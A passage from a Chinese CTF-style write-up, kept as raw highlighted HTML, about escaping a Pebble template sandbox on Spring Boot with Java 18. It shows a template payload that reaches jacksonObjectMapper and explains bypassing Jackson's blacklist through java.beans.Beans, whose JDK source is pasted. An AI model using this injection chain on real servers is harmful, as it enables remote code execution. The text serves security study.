&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">template&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">orElse&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;home.pebble&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一堆输出，其中的internalCachingMetadataReaderFactory对象可以拿到classLoader&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">applicationContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907172251785.png" alt="image-20220907172251785">&lt;/p>
&lt;p>我们可以用它的loadClass加载任意类了，但是我们再继续用它的方法，幸运的是这里还有jackson，beans里面也能获取到&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907173342035.png" alt="image-20220907173342035">&lt;/p>
&lt;p>可以用jackson获取到类的实例，进而调用方法&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set ame = beans.get(&amp;#34;jacksonObjectMapper&amp;#34;).readValue(&amp;#34;{}&amp;#34;, classssss)%}
&lt;/code>&lt;/pre>&lt;h3 id="绕过jackson黑名单">绕过jackson黑名单&lt;/h3>
&lt;p>然而题目环境是最新的java18，常用的一些办法不能用，比如ScriptEngineManager，由于jackson实例化限制我们也不能直接实例化jshell；但是我们可以借助java.beans.Beans类，它可以帮我们实例化任意方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">instantiate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassLoader&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">beanName&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">BeanContext&lt;/span> &lt;span style="color:#111">beanContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AppletInitializer&lt;/span> &lt;span style="color:#111">initializer&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">ins&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">oins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">serialized&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">serex&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// If the given classloader is null, we check if an
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// system classloader is available and (if so)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// use that instead.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Note that calls on the system class loader will
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// look in the bootstrap class loader first.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSystemClassLoader&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">SecurityException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// We&amp;#39;re not allowed to access the system class loader.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Drop through.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Try to find a serialized object with this name
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">serName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">beanName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">concat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.ser&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSystemResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">serName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">serName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ins&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ins&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStreamWithLoader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ins&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">oins&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">serialized&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oins&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ins&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Drop through and try opening the class. But remember
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// the exception in case we can&amp;#39;t find the class either.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">serex&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ins&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// No serialized object, try just instantiating the class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">cl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassFinder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">findClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">beanName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// There is no appropriate class. If we earlier tried to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// deserialize an object and got an IO exception, throw that,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// otherwise rethrow the ClassNotFoundException.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">serex&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">serex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPublic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; : no public access&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Try to instantiate the class.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// We have to remap the exception to one in our signature.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// But we pass extra information in the detail message.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">cl&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ex&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Ok, if the result is an applet initialize it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">AppletStub&lt;/span> &lt;span style="color:#111">stub&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Applet&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Applet&lt;/span> &lt;span style="color:#111">applet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Applet&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">needDummies&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">initializer&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">needDummies&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Figure our the codebase and docbase URLs. We do this
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// by locating the URL for a known resource, and then
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// massaging the URL.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// First find the &amp;#34;resource name&amp;#34; corresponding to the bean
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// itself. So a serialzied bean &amp;#34;a.b.c&amp;#34; would imply a
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// resource name of &amp;#34;a/b/c.ser&amp;#34; and a classname of &amp;#34;x.y&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// would imply a resource name of &amp;#34;x/y.class&amp;#34;.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resourceName&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">serialized&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Serialized bean
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">resourceName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">beanName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">concat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.ser&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Regular class
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">resourceName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">beanName&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">concat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">objectUrl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
